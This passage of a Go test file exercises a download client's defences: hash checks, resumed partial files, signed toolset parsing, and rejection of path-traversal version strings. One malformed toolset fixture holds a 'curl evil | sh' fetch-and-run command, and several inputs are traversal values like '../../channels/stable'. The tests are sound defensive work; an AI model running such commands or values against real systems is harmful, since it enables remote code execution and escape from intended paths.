	}{
		"partial-without-validator": {partial: damaged},
		"validator-without-partial": {validator: `"v1"`},
		"empty-partial":             {partial: []byte{}, validator: `"v1"`},
		"good-half":                 {partial: half, validator: `"v1"`},
		"stale-validator":           {partial: damaged, validator: `"v0"`},
		"longer-than-the-artifact":  {partial: append(append([]byte{}, body...), body...), validator: `"v1"`},
		// The resumed bytes were damaged on disk: only the hash can tell.
		"damaged-half": {partial: damaged, validator: `"v1"`, firstErr: "sha256 mismatch"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			o := &rangeOrigin{body: body}
			o.cut.Store(true) // no cut: only the leftovers are under test
			srv := httptest.NewServer(o)
			defer srv.Close()

			dir := t.TempDir()
			dest := filepath.Join(dir, "kernel.img")
			partial := dest + httpclient.PartialSuffix
			if tc.partial != nil {
				require.NoError(t, os.WriteFile(partial, tc.partial, 0o644))
			}
			if tc.validator != "" {
				require.NoError(t, os.WriteFile(partial+httpclient.ValidatorSuffix, []byte(tc.validator), 0o644))
			}
			a := Asset{URL: srv.URL + "/kernel.img", SHA256: sha(body), Size: int64(len(body))}

			err := (&Client{}).DownloadArtifact(context.Background(), a, dest)
			if tc.firstErr != "" {
				require.ErrorContains(t, err, tc.firstErr)
				_, statErr := os.Stat(dest)
				require.True(t, os.IsNotExist(statErr), "damaged bytes were installed")
				// The bad leftovers are gone, so trying again works.
				err = (&Client{}).DownloadArtifact(context.Background(), a, dest)
			}
			require.NoError(t, err)
			got, rerr := os.ReadFile(dest)
			require.NoError(t, rerr)
			assert.Equal(t, body, got)
			assert.Equal(t, []string{"kernel.img"}, dirNames(t, dir))
		})
	}
}

// The destination cannot be written at all.
func TestFaults_ArtifactDestinationUnusable(t *testing.T) {
	body := artifactBody()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write(body) }))
	defer srv.Close()
	a := Asset{URL: srv.URL + "/a", SHA256: sha(body), Size: int64(len(body))}

	// The parent of the destination is a file.
	dir := t.TempDir()
	blocker := filepath.Join(dir, "tools")
	require.NoError(t, os.WriteFile(blocker, []byte("not a directory"), 0o644))
	require.Error(t, (&Client{}).DownloadArtifact(context.Background(), a, filepath.Join(blocker, "kernel.img")))
	got, err := os.ReadFile(blocker)
	require.NoError(t, err)
	assert.Equal(t, "not a directory", string(got))

	// The destination is a directory with something in it: the verified
	// download cannot replace it, and must say so rather than report success.
	dest := filepath.Join(dir, "kernel.img")
	require.NoError(t, os.MkdirAll(filepath.Join(dest, "keep"), 0o755))
	require.Error(t, (&Client{}).DownloadArtifact(context.Background(), a, dest))
	_, err = os.Stat(filepath.Join(dest, "keep"))
	require.NoError(t, err)

	// The command is interrupted before the request is made.
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	free := filepath.Join(t.TempDir(), "kernel.img")
	err = (&Client{}).DownloadArtifact(ctx, a, free)
	require.ErrorIs(t, err, context.Canceled)
	_, err = os.Stat(free)
	require.ErrorIs(t, err, os.ErrNotExist)
}

// The hash in the manifest is matched whatever its letter case or padding;
// what must match is the bytes.
func TestFaults_ArtifactHashSpelling(t *testing.T) {
	body := artifactBody()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write(body) }))
	defer srv.Close()
	for _, spelled := range []string{strings.ToUpper(sha(body)), " " + sha(body) + "\n"} {
		dest := filepath.Join(t.TempDir(), "a")
		require.NoError(t, (&Client{}).DownloadArtifact(context.Background(), Asset{URL: srv.URL, SHA256: spelled}, dest))
	}
	for _, spelled := range []string{sha(body)[:63], sha(body) + "00", "sha256:" + sha(body), strings.Repeat("0", 64)} {
		dir := t.TempDir()
		err := (&Client{}).DownloadArtifact(context.Background(), Asset{URL: srv.URL, SHA256: spelled}, filepath.Join(dir, "a"))
		require.ErrorContains(t, err, "sha256 mismatch")
		assert.Empty(t, dirNames(t, dir))
	}
}

// --- toolset documents and manifest generation -----------------------------

// The origin fails while serving a toolset document or its signature.
func TestFaults_ToolsetFetchFailures(t *testing.T) {
	s := newTestSigner(t)
	doc := []byte(`{"version":"v0.2.3","mkfs":{"linux-amd64":{"url":"https://x/mkfs","sha256":"ab","size":4}}}`)
	sig := s.sign(doc, "t")
	failures := map[string]http.HandlerFunc{
		"404":       func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusNotFound) },
		"500":       func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusInternalServerError) },
		"no-answer": func(w http.ResponseWriter, _ *http.Request) { refuse(w) },
		"empty":     func(http.ResponseWriter, *http.Request) {},
	}
	for _, target := range []string{"toolset.json", "toolset.json.minisig"} {
		body := doc
		if target != "toolset.json" {
			body = sig
		}
		failures["cut-mid-body"] = func(w http.ResponseWriter, _ *http.Request) { hangUp(w, nil, body, len(body)/2) }
		failures["half-the-bytes"] = func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write(body[:len(body)/2]) }
		for name, fail := range failures {
			t.Run(target+"/"+name, func(t *testing.T) {
				srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
					switch {
					case strings.HasSuffix(r.URL.Path, "/"+target):
						fail(w, r)
					case strings.HasSuffix(r.URL.Path, ".minisig"):
						_, _ = w.Write(sig)
					default:
						_, _ = w.Write(doc)
					}
				}))
				defer srv.Close()
				c, err := NewClient(srv.URL, s.publicKey())
				require.NoError(t, err)
				ts, err := c.FetchToolset(context.Background(), "v0.2.3")
				require.Error(t, err)
				require.Nil(t, ts)
			})
		}
	}
}

func TestFaults_SignedButUnusableToolsets(t *testing.T) {
	cases := map[string]string{
		"not-json":      `mkfs`,
		"truncated":     `{"version":"v0.2.3","mkfs":{"linux-amd64":{"url":"u","sha`,
		"other-version": `{"version":"v0.2.2","mkfs":{"linux-amd64":{"url":"u","sha256":"ab","size":4}}}`,
		"no-version":    `{"mkfs":{"linux-amd64":{"url":"u","sha256":"ab","size":4}}}`,
		"no-mkfs":       `{"version":"v0.2.3"}`,
		"empty-mkfs":    `{"version":"v0.2.3","mkfs":{}}`,
		"no-hash":       `{"version":"v0.2.3","mkfs":{"linux-amd64":{"url":"u","size":4}}}`,
		"no-size":       `{"version":"v0.2.3","mkfs":{"linux-amd64":{"url":"u","sha256":"ab"}}}`,
		"negative-size": `{"version":"v0.2.3","mkfs":{"linux-amd64":{"url":"u","sha256":"ab","size":-1}}}`,
		"unknown-field": `{"version":"v0.2.3","run":"curl evil | sh","mkfs":{"linux-amd64":{"url":"u","sha256":"ab","size":4}}}`,
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			ts, err := ParseToolset([]byte(doc), "v0.2.3")
			require.Error(t, err)
			require.Nil(t, ts)
		})
	}
	ts, err := ParseToolset([]byte(`{"version":"v0.2.3","mkfs":{"linux-amd64":{"url":"u","sha256":"ab","size":4}}}`), "v0.2.3")
	require.NoError(t, err)
	_, err = ts.MkfsAsset("darwin", "arm64")
	require.ErrorContains(t, err, "darwin-arm64")
}

// A version taken from an image recipe ends up in a URL and a directory name.
func TestFaults_ToolsetVersionCannotEscapeItsPath(t *testing.T) {
	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { hits.Add(1) }))
	defer srv.Close()
	c, err := NewClient(srv.URL, newTestSigner(t).publicKey())
	require.NoError(t, err)
	for _, v := range []string{"", "..", "../../channels/stable", "v0.2.3/../../x", "0.2", "v0.2.3?x=1", "v0.2.3#f", "0.2.3\n", "v0.2.3 ", `v0.2.3\..`, "v0.2.3-", "v0.2.3-a/b"} {
		if v == "v0.2.3 " || v == "0.2.3\n" {
			// Surrounding space is trimmed, never passed on.
			got, err := NormalizeToolsetVersion(v)
			require.NoError(t, err)
			require.Equal(t, "v0.2.3", got)
			continue
		}
		_, err := c.FetchToolset(context.Background(), v)
		require.ErrorContains(t, err, "invalid toolset version", "version %q", v)
		require.Error(t, CheckToolsetVersion(v))
	}
	assert.Zero(t, hits.Load(), "an invalid version reached the network")
}

// Manifest generation reads the staged release files; one that is missing or
// unreadable must stop the release, not publish a hash of nothing.
func TestFaults_BuildManifestWithBadInputs(t *testing.T) {
	dir := t.TempDir()
	file := filepath.Join(dir, "cli")
	require.NoError(t, os.WriteFile(file, []byte("binary"), 0o644))
	missing := filepath.Join(dir, "missing")
	comp := func(c SpecComponent) Spec {
		return Spec{Channel: "stable", Base: "https://releases.example/", Components: map[string]SpecComponent{"cli": c}}
	}
	cases := map[string]Spec{
		"no-channel":        {Base: "https://x", Components: map[string]SpecComponent{"cli": {Version: "v1", File: file}}},
		"no-base":           {Channel: "stable", Components: map[string]SpecComponent{"cli": {Version: "v1", File: file}}},
		"no-version":        comp(SpecComponent{File: file}),
		"no-files":          comp(SpecComponent{Version: "v1"}),
		"file-missing":      comp(SpecComponent{Version: "v1", File: missing}),
		"file-is-a-dir":     comp(SpecComponent{Version: "v1", File: dir}),
		"platform-missing":  comp(SpecComponent{Version: "v1", Platforms: map[string]string{"linux-amd64": file, "linux-arm64": missing}}),
		"named-file-absent": comp(SpecComponent{Version: "v1", Files: map[string]string{"mkfs": file, "boot.img": missing}}),
	}
	for name, spec := range cases {
		t.Run(name, func(t *testing.T) {
			m, err := BuildManifest(spec)
			require.Error(t, err)
			require.Nil(t, m)
		})
	}

	// What it does build must be accepted by the client that will read it.
	m, err := BuildManifest(comp(SpecComponent{Version: "v1", File: file}))
	require.NoError(t, err)
	data, err := m.Marshal()
	require.NoError(t, err)
	parsed, err := ParseManifest(data)
	require.NoError(t, err)
	cli, _ := parsed.Component(ComponentCLI)
	assert.Equal(t, sha([]byte("binary")), cli.SHA256)
	assert.Equal(t, "https://releases.example/cli/v1/cli", cli.URL)
}
